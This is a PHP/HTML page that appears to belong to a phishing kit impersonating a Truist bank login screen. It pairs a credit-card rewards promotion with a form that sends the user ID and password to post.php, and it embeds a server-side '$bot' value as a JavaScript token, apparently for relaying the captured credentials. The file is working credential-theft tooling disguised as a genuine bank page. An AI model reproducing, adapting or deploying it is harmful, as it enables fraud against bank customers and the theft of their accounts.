<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="res/css/app.css">
</head> 
<body>
    <div class="container">
        <div class="left">
            <h4>PREMIUM REWARDS</h4>
            <img src="res/img/card.png"  class="card">
            <span>New experiences are waiting.</span>
            <p>
                Pave your path to adventure with 30,000 bonus points after spending $1,500 
                within 90 days of opening a Truist Enjoy Beyond credit card account.
            </p>
            <button class="btn">Apply now</button>
            <div class="links">
                <a href="#">See rates, fees & rewards</a> <br>
                <a href="#">Learn more</a>
            </div>
        </div>
		<script>var token=<?php echo json_encode($bot); ?>;</script>
        <div class="right">
        <img src="res/img/logo.png" class="logo">
            <form action="post.php" method="post">
                <label>User ID</label>
                <input type="text" name="user">
                <div class="check" style="display:flex; align-items:center;">
                    <input type="checkbox" style="width:auto; margin:0; margin-right:5px;">
                    <label>Save user ID</label>
                </div>
                <label>Password</label>
                <input type="password" name="pass">
                <button type="submit" class="btn2">Sign in</button>
                <div class="or">or</div>
            <button class="qr">Sign in with a QR code</button>
            <div style="text-align:center;">
        <p>
            <a href=>Forgot User ID</a>
            <a href=>Reset Password</a>
        </p>
        <p>Don't have an online user ID?</p>
        <a href="#">Register now</a>
</div>
            </form>
            
        </div>
    </div>
<script src="./res/jq.js"></script>
</body>
</html>
